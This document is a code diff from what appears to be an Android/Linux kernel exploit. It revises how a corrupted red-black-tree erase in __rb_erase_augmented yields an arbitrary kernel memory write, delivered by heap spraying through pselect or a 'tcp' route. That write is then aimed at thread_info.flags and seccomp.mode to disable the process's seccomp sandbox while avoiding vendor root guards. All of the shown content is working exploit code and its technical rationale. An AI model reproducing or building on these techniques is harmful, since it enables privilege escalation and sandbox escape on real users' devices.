@@ -332,10 +332,11 @@ int run_main_route_threads(void) {
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
-  /* leaf=1 uses the "write 0" payload (fake_right=0). __rb_erase_augmented()
-   * case 1 then makes __rb_change_child() write parent->rb_right (= target)
-   * with the erased node's rb_right value: fake_left is always NULL so case 1
-   * always fires, and the erased node is RED so no color fixup runs. */
+  /* Both transports deliver *(target) := value via the erase's left-only
+   * relink: the consumed waiter words are {pi pc = value, rb_right = 0,
+   * rb_left = target}, so __rb_erase_augmented() stores the pc word into
+   * *(rb_left); the node is RED (even pc) so no color fixup follows.
+   * leaf=1 is just the value=0 payload (fake_right=0). */
   pselect_child_node = leaf ? 0 : 1;
   set_pselect_write_mode(target, mode);
   TIMER("  heap spray start");
@@ -996,23 +997,27 @@ int run_exploit(int argc, char **argv) {
      * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
      * must be zeroed too; do both writes back-to-back with one probe
      * (real finit_module calls trip vendor root guards).
-     * Leaf writes land on [target] or [target+8]; a comm probe picks the side
-     * before targeting thread_info.flags (task+0) / seccomp.mode. */
+     * tcp stamps *(target) exactly, so aim straight at thread_info.flags
+     * (task+0) / seccomp.mode; only the pselect fallback needs the comm
+     * probe to tell [target] from [target+8]. */
     if (!process_has_seccomp()) {
       pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
       seccomp_ok = 1;
       break;
     }
 
+    int tcp_writes = tcp_route_selected();
     struct w3_stage_context w3_context = {
       .pipes = &pipes,
-      .leaf_to_target8 = 1,
+      .leaf_to_target8 = !tcp_writes,
     };
-    int dir_ok = retry_write_stage(
-        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
-        verify_leaf_dir_stage, &w3_context, 1);
-    if (!dir_ok) {
-      pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+    if (!tcp_writes) {
+      int dir_ok = retry_write_stage(
+          "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
+          verify_leaf_dir_stage, &w3_context, 1);
+      if (!dir_ok) {
+        pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
+      }
     }
 
     uintptr_t flags_target = w3_context.leaf_to_target8
